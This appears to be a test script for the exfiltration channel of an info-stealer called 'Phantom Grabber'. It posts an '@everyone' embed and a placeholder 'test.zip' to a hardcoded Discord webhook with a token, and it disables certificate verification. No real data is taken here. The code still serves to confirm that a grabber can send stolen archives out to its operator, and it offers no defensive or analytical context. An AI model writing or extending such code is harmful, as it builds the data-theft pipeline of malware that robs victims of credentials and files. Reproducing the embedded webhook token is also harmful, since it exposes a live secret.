import urllib3
import json
import time

webhook_url = "https://discord.com/api/webhooks/1495260088485675159/RzyYFS2-StCLxbmwm47lXiH0p44OxEVhS28vqgWwSFcVYZRCfk6FrR3_-h7WAsI3FtCn"
http = urllib3.PoolManager(cert_reqs='CERT_NONE')

embed = {
    'title': '👻 Phantom Grabber — Test Hit',
    'color': 0x7B2FBE,
    'fields': [
        {'name': 'Test', 'value': 'Just a test to check if the Discord webhook URL is valid and receiving multipart forms.', 'inline': False}
    ]
}

# Attach file directly via multipart
boundary = f'----PhantomBoundary{int(time.time())}'
payload_json = json.dumps({'content': '@everyone', 'embeds': [embed]})

body = b''
# Payload JSON part
body += f'--{boundary}\r\n'.encode()
body += b'Content-Disposition: form-data; name="payload_json"\r\n'
body += b'Content-Type: application/json\r\n\r\n'
body += payload_json.encode('utf-8')
body += b'\r\n'

# Fake File part
file_data = b"Hello this is a fake zip file for testing."
body += f'--{boundary}\r\n'.encode()
body += f'Content-Disposition: form-data; name="file"; filename="test.zip"\r\n'.encode()
body += b'Content-Type: application/octet-stream\r\n\r\n'
body += file_data
body += b'\r\n'

body += f'--{boundary}--\r\n'.encode()

try:
    resp = http.request('POST', webhook_url, body=body,
                 headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                 timeout=10.0)
    print(f"Status: {resp.status}")
    print(f"Response: {resp.data.decode()}")
except Exception as e:
    print(f"Error: {e}")
